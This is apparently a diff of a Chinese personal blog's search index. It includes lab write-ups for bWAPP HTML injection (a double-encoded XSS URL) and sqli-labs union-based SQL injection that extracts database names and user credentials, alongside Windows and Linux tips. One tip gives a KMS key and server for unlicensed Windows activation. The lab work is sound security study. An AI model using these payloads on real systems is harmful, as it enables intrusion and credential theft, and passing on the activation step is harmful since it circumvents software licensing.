@@ -109,7 +109,7 @@
   </entry>
   <entry>
     <title><![CDATA[Bwapp-Writeup]]></title>
-    <url>%2F2018%2F08%2F05%2FBwapp%2F</url>
+    <url>%2F2018%2F08%2F05%2FBwapp%E9%83%A8%E5%88%86writeup%2F</url>
     <content type="text"><![CDATA[Injection1.HTML Injection - Reflected (GET)1.1 low源码未进行任何过滤 1234function no_check($data)&#123; return $data;&#125; 便可想到插入xss语句以及其他类型语句查看源码发现输入的语句以及嵌入到源码中 1.2 medium按照上面的方法进行语句插入，发现直接显示源码，查看源码发现进行了html标签过滤 1234$input = str_replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;, $data);$input = str_replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;, $input);$input = urldecode($input);return $input; 既然对输入的数据进行了编码，那就需要绕过了，对其进行一次url编码不可以，那就对输入的数据进行二次url编码，成功了测试url： 1http://192.168.112.129/bWAPP/htmli_get.php?firstname=%253Cscript%253Ealert%2528%2527xss%2527%2529%253B%253C%252fscript%253E&amp;lastname=%253Ca%2520href%253D%2522http%253A%252f%252fwww.baidu.com%2522%253Eclick%253C%252fa%253E&amp;form=submit 查看源码，已经成功写入 1.3 high这个使用了==htmlentities()==将所有适用的字符转换为HTML实体，故安全性比较略高讲解绕过htmlentities至此，可以发现html注入反射型漏洞也是有很大危害的，可以进行xss攻击、页面篡改等攻击 2.HTML Injection - Reflected (POST)post的和get型方式一样，不做过多介绍 3.HTML Injection - Reflected (URL)3.1 lowBP抓包，修改host为1.1.1.1 3.2 mediumdocument.write(),动态向页面写入内容document.URL 返回当前页面或文档的URL 1$url = &quot;&lt;script&gt;document.write(document.URL)&lt;/script&gt;&quot;; 3.3 high123456789101112131415161718 case &quot;2&quot; : $url = &quot;http://&quot; . $_SERVER[&quot;HTTP_HOST&quot;] . xss_check_3($_SERVER[&quot;REQUEST_URI&quot;]); break;function xss_check_3($data, $encoding = &quot;UTF-8&quot;)&#123; // htmlspecialchars - converts special characters to HTML entities // &apos;&amp;&apos; (ampersand) becomes &apos;&amp;amp;&apos; // &apos;&quot;&apos; (double quote) becomes &apos;&amp;quot;&apos; when ENT_NOQUOTES is not set // &quot;&apos;&quot; (single quote) becomes &apos;&amp;#039;&apos; (or &amp;apos;) only when ENT_QUOTES is set // &apos;&lt;&apos; (less than) becomes &apos;&amp;lt;&apos; // &apos;&gt;&apos; (greater than) becomes &apos;&amp;gt;&apos; return htmlspecialchars($data, ENT_QUOTES, $encoding); &#125; 4.]]></content>
       <categories>
         <category>Security</category>
@@ -174,14 +174,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[win10开机键盘无法使用问题]]></title>
-    <url>%2F2018%2F05%2F05%2F%E9%94%AE%E7%9B%98%E9%97%AE%E9%A2%98%2F</url>
-    <content type="text"><![CDATA[电脑开机外置键盘无法使用进入设备管理器发现键盘下的PC/AT 增强型PS/2键盘驱动为感叹号打开注册表，此时键盘无法使用，那就进入C盘Windows文件下双击regedit.exe文件打开注册表，依次进入HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4D36E96B-E325-11CE-BFC1-08002BE10318}删除UpperFilters项在设备管理器下的键盘选项里删除PC/AT 增强型PS/2键盘卸载此设备，重新启动。此时安装驱动会提示错误代码10，该设备无法启动。 接着修改注册表：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4D36E96B-E325-11CE-BFC1-08002BE10318}添加字符串UpperFilters项，内容为kbdclass卸载设备，重新启动。重新启动后问题得以解决。]]></content>
-      <tags>
-        <tag>Windows</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[sqli-lab]]></title>
     <url>%2F2018%2F05%2F01%2Fsqli-lab%2F</url>
     <content type="text"><![CDATA[1、 sqli-labs需要lamp或wamp环境，本机使用wamp环境，使用phpstudy的集成环境2、 Sqli-labs的安装，下载sqli-labs，解压到本地www目录下，打开WWW\sqli-labs\sql-connections文件下的db-creds.inc文件，修改mysql账户和密码和本机mysql数据库账户和密码一致3、 浏览器输入http://127.0.0.1/sqli-labs，单击Setup/reset Database for labs此时sqli-labs平台已经搭建好了选择第一关，让输入一个参数进入，那就先传入?id=1吧1、先判断是字符型还是整数型http://127.0.0.1/sqli-labs/Less-1/?id=1http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;进一步判断，http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; and ‘1’=’1 ，页面正常http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; and ‘1’=’2确定是字符型注入2、判断查询列数http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; order by 4–+报错，未知的4列，那就试一下3http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; order by 3–+现在知道是有三列了3、判断显示位http://127.0.0.1/sqli-labs/Less-1/?id=-1‘ union select 1,2,3–+查询所使用的数据库，以及数据库版本，大于5.0版本的数据库存在information_schema库,http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,database(),version()–+4、 获取所有数据库名http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),2–+ 5、 获取数据库所有表名Sqli-labs使用的数据库是security查询数据库中所有表：http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),2–+ 6、 获取表中所有字段Users表中存放用户信息，来查看一下http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=’security’ and table_name=’users’),2–+发现有三个字段，7、 获取字段中的数据http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,(select concat_ws(char(32,58),id,username,password) from users limit 1,1),2–+一次获取一个账户信息，通过limit 0,1 第一个参数控制第n-1个id，第二个参数控制显示行数]]></content>
@@ -193,8 +185,8 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[Linux&Windows之命令行使用]]></title>
-    <url>%2F2018%2F04%2F26%2FLinux-Windows%E4%B9%8B%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BD%BF%E7%94%A8%2F</url>
+    <title><![CDATA[OS命令行使用]]></title>
+    <url>%2F2018%2F04%2F26%2FOS%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BD%BF%E7%94%A8%2F</url>
     <content type="text"><![CDATA[Linux系统下基本命令： （区分大小写 ）uname 显示版本信息（同win2K的 ver ）dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir）pwd 查询当前所在的目录位置cd cd ..回到上一层目录，注意cd 与..之间有空格。cd /返回到根目录。cat 文件名 查看文件内容cat &gt;abc.txt 往abc.txt文件中写上内容。more 文件名 以一页一页的方式显示一个文本文件。cp 复制文件mv 移动文件rm 文件名 删除文件，rm -a 目录名删除目录及子目录mkdir 目录名 建立目录rmdir 删除子目录，目录内没有文档。chmod 设定档案或目录的存取权限grep 在档案中查找字符串diff 档案文件比较find 档案搜寻date 现在的日期、时间who 查询目前和你使用同一台机器的人以及Login时间地点w 查询目前上机者的详细资料whoami 查看自己的帐号名称groups 查看某人的Grouppasswd 更改密码history 查看自己下过的命令ps 显示进程状态kill 停止某进程gcc 黑客通常用它来编译C语言写的文件su 权限转换为指定使用者telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。ftp ftp连接上某服务器（同win2K） windows 系统命令大全常用的CMD命令：cd 改变当前目录cls 清屏copy 拷贝文件del 删除文件deltree 删除目录树dir 列文件名diskcopy 复制磁盘edit 文本编辑format 格式化磁盘md 建立子目录more 分屏显示move 移动文件、改目录名rd 删除目录ren 改变文件名echo 内容 &gt; 文件名 创建新文件type 显示文件内容xcopy 拷贝目录与文件attrib 设置文件属性chkdsk 检查磁盘date 显示及修改日期defrag 磁盘碎片整理doskey 重新调用DOS命令emm386 扩展内存管理fdisk 硬盘分区help 帮助label 设置卷标号path 设置搜寻目录prempt 设置提示符restore 恢复备份文件time 显示及修改时间scandisk检测、修理磁盘set 设置环境变量smartdrv设置磁盘加速器undelete恢复被删的文件append 设置非执行文件路径debug 随机调试程序diskcomp磁盘比较expand 还原DOS文件fasthelp快速显示帮助信息fc 文件比较interink启动服务器intersvr启动客户机qbasic Basic集成环境setver 设置版本share 文件共享subst 路径替换tree 列目录树unformat恢复已格式化的磁盘vsafe 防病毒ver 显示DOS版本号vol 显示磁盘卷标号ctty 改变控制设备nbtstat 该命令使用TCP/IP上的NetBIOS显示协议统计和当前TCP/IP连接，使用这个命令你可以得到远程主机的NETBIOS信息 计算机运行命令全集winver———检查Windows版本wmimgmt.msc—-打开windows管理体系结构wupdmgr——–windows更新程序winver———检查Windows版本wmimgmt.msc—-打开windows管理体系结构wupdmgr——–windows更新程序wwww——–windows脚本宿主设置write———-写字板winmsd—–系统信息wiaacmgr——-扫描仪和照相机向导winchat——–XP自带局域网聊天mem.exe——–显示内存使用情况Msconfig.exe—系统配置实用程序mplayer2——-简易widnows media playermspaint——–画图板mstsc———-远程桌面连接mplayer2——-媒体播放机magnify——–放大镜实用程序mmc————打开控制台mobsync——–同步命令dxdiag———检查directx信息drwtsn32—— 系统医生devmgmt.msc— 设备管理器dfrg.msc——-磁盘碎片整理程序diskmgmt.msc—磁盘管理实用程序dcomcnfg——-打开系统组件服务ddeshare——-打开DDE共享设置dvdplay——–DVD播放器net stop messenger—–停止信使服务net start messenger—-开始信使服务notepad——–打开记事本nslookup——-网络管理的工具向导ntbackup——-系统备份和还原narrator——-屏幕”讲述人”ntmsmgr.msc—-移动存储管理器ntmsoprq.msc—移动存储管理员操作请求netstat -an—-(TC)命令检查接口syncapp——–创建一个公文包sysedit——–系统配置编辑器sigverif——-文件签名验证程序sndrec32——-录音机shrpubw——–创建共享文件夹secpol.msc—–本地安全策略syskey———系统加密，一旦加密就不能解开，保护windows xp系统的双重密码services.msc—本地服务设置Sndvol32——-音量控制程序sfc.exe——–系统文件检查器sfc /scannow—windows文件保护tsshutdn——-60秒倒计时关机命令tourstart——xp简介（安装完成后出现的漫游xp程序）taskmgr——–任务管理器eventvwr——-事件查看器eudcedit——-造字程序explorer——-打开资源管理器packager——-对象包装程序perfmon.msc—-计算机性能监测程序progman——–程序管理器regedit.exe—-注册表rsop.msc——-组策略结果集regedt32——-注册表编辑器rononce -p —-15秒关机regsvr32 /u *.dll—-停止dll文件运行regsvr32 /u zipfldr.dll——取消ZIP支持cmd.exe——–CMD命令提示符chkdsk.exe—–Chkdsk磁盘检查certmgr.msc—-证书管理实用程序calc———–启动计算器charmap——–启动字符映射表cliconfg——-SQL SERVER 客户端网络实用程序Clipbrd——–剪贴板查看器conf———–启动netmeetingcompmgmt.msc—计算机管理cleanmgr——-**整理ciadv.msc——索引服务程序osk————打开屏幕键盘odbcad32——-ODBC数据源管理器oobe/msoobe /a—-检查XP是否激活lusrmgr.msc—-本机用户和组logoff———注销命令iexpress——-木马捆绑工具，系统自带Nslookup——-IP地址侦测器fsmgmt.msc—–共享文件夹管理器utilman——–辅助工具管理器gpedit.msc—–组策略]]></content>
       <categories>
         <category>Tools</category>
@@ -205,8 +197,8 @@
   </entry>
   <entry>
     <title><![CDATA[Windows使用问题]]></title>
-    <url>%2F2018%2F04%2F22%2FWindows%E4%BD%BF%E7%94%A8%E9%97%AE%E9%A2%98%2F</url>
-    <content type="text"><![CDATA[windows管理员权限删除文件依然删除不掉电脑在开机状态下按shift键，选择重启，开机进入高级选项模式，进入命令行模式，使用命令删除此类文件rd /s /q 文件夹del /F /S /Q 文件夹]]></content>
+    <url>%2F2018%2F04%2F22%2FWindows%E9%83%A8%E5%88%86%E9%97%AE%E9%A2%98%2F</url>
+    <content type="text"><![CDATA[windows管理员权限删除文件依然删除不掉电脑在开机状态下按shift键，选择重启，开机进入高级选项模式，进入命令行模式，使用命令删除此类文件rd /s /q 文件夹del /F /S /Q 文件夹 电脑开机外置键盘无法使用进入设备管理器发现键盘下的PC/AT 增强型PS/2键盘驱动为感叹号打开注册表，此时键盘无法使用，那就进入C盘Windows文件下双击regedit.exe文件打开注册表，依次进入HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4D36E96B-E325-11CE-BFC1-08002BE10318}删除UpperFilters项在设备管理器下的键盘选项里删除PC/AT 增强型PS/2键盘卸载此设备，重新启动。此时安装驱动会提示错误代码10，该设备无法启动。 接着修改注册表：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4D36E96B-E325-11CE-BFC1-08002BE10318}添加字符串UpperFilters项，内容为kbdclass卸载设备，重新启动。重新启动后问题得以解决。]]></content>
       <categories>
         <category>Windows</category>
       </categories>
@@ -250,8 +242,8 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[Win resystem]]></title>
-    <url>%2F2018%2F04%2F19%2Fsystem%2F</url>
+    <title><![CDATA[Install-system]]></title>
+    <url>%2F2018%2F04%2F19%2FInstall-System%2F</url>
     <content type="text"><![CDATA[首先要有一个U盘启动盘或者装机光盘； 一、安装Win10，按Esc进入BIOS设置两项， Launch CSm关闭 Security Boot选择Disable修改完成后按F10保存并退出接下来就该修改磁盘格式为GPT格式了，进入安装界面时按住Shift+F10，进入命令行， 首先输入diskpart 进入磁盘操作界面list disk 查看磁盘名及类型select disk 0 清除磁盘格式clean 安装win10需要格式化为gpt格式convert gpt 格式化完成后进行分区create paraition 创建EFI分区，执行create partition efi size=200（分区大小为200MB） 创建MSR分区，执行create partition msr size=200（微软系统保留分区） 创建主分区，执行create partition primary size=xxx（具体大小根据你的要求而定，作为系统分区来说，如果有足够空间，可以留出大于100GB即102400MB的空间，命令为create partition primary size=102400，方便系统有足够周转空间） 如果还有剩余空间，可继续重复执行上述命令来创建新的分区（注意修改具体数值）。但建议用户创建完系统分区后就退出命令提示符继续安装系统，毕竟这种方式不容易估算剩下的硬盘空间大小，进入安装程序后可以进一步划分剩余空间，也可以在安装结束后，进入系统磁盘管理中进行分配 企业版win10激活方法，鼠标右击win键，点击Windows Powershell（管理员），依次输入一下命令，如若序列号不可使用，请百度最新win10企业版序列号替换即可，也可以使用Windows激活工具进行激活/upk123slmgr /ipk NPPR9-FWDCX-D2C8J-H872K-2YT43slmgr /skms zh.us.toslmgr /ato 二、安装Win7听说现在新版电脑不再支持安装Win7了，当然如果你的电脑支持安装Win7，最好不过了。按Esc进入Bios 修改Lanuch CMS为Enable Security Boot选择Disable修改完成后按F10保存并退出接下来就该修改磁盘格式了，进入安装界面时按住Shift+F10，进入命令行， 首先输入diskpart 进入磁盘操作界面list disk 查看磁盘名及类型select disk 0 清除磁盘格式clean 安装win7需要格式化为MBR格式convert mbr操作完成后输入exit退出到选择安装系统到哪个磁盘时再进行分区，这是Win7与Win10的不同，分多内存看自己电脑磁盘空间大小，C盘建议分100GB即可，此时电脑会自动分出100MB内存给系统默认分区，选择系统盘时选择自己刚刚创建的100GB的分区就可以，其它剩余的内存安装好系统后进去磁盘管理再分区会更加方便。]]></content>
       <categories>
         <category>Windows</category>
@@ -284,7 +276,7 @@
   </entry>
   <entry>
     <title><![CDATA[ssh远程连接Linux]]></title>
-    <url>%2F2018%2F04%2F07%2F%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5Linux%2F</url>
+    <url>%2F2018%2F04%2F07%2FLinux%E9%85%8D%E7%BD%AEssh%2F</url>
     <content type="text"><![CDATA[首先,确定是否有安装SSH服务命令：ps -e | grep ssh*如果没有任何显示,则没有安装该服务其次,安装SSH-serversudo apt-get install openssh-server接着,更重要的是安装SSH-clientsudo apt-get install openssh-client确认安装SSH服务成功与否ps -e | grep ssh*如果,看到sshd表明ssh-server启动了; 服务器端设置ssh免密首先Linux要配置好ssh免密连接cd /root/.ssh/如果没有此文件，可以先使用ssh localhost之后便可以进入.ssh文件ls查看只有这一个文件,known_hosts先在本机生成公钥和私钥, ssh-keygen -t rsa三次回车将公钥写入认证里面,cat ./id_rsa.pub &gt;&gt; ./authorized_keys修改文件authorized_keys权限为600,chmod 600 .ssh/authorized_keys至此，ssh免密已经配置好了，上述步骤如下 使用Xshell免密远程连接linux转自https://www.linuxidc.com/Linux/2015-03/114947.htm补充网址里面的第六步：复制生成的公钥到linux可以直接将本地id_rsa_2048.pub直接复制过去,将其放入/root/.ssh/文件夹下，使用此命令写入认证cat ./id_rsa_2048.pub &gt;&gt; ./authorized_keys此时再按照上面的网址操作即可 使用cmder免密连接linux先在本机生成公钥和私钥, ssh-keygen -t rsa将生成的id_rsa.pub重命名为id_rsa0.pub(因为linux下一句有一个与此同名的文件),上传至服务器;window下生成的id_rsa.pub存放于C:\Users\用户名\.ssh下将其放入/root/.ssh/文件夹下;使用此命令写入认证cat ./id_rsa0.pub &gt;&gt; ./authorized_keys此时Cmder连接linux已经免密了 PS：使用ssh连接，关闭linux系统防火墙才可连接，关闭防火墙命令service iptables stop]]></content>
       <categories>
         <category>Linux</category>
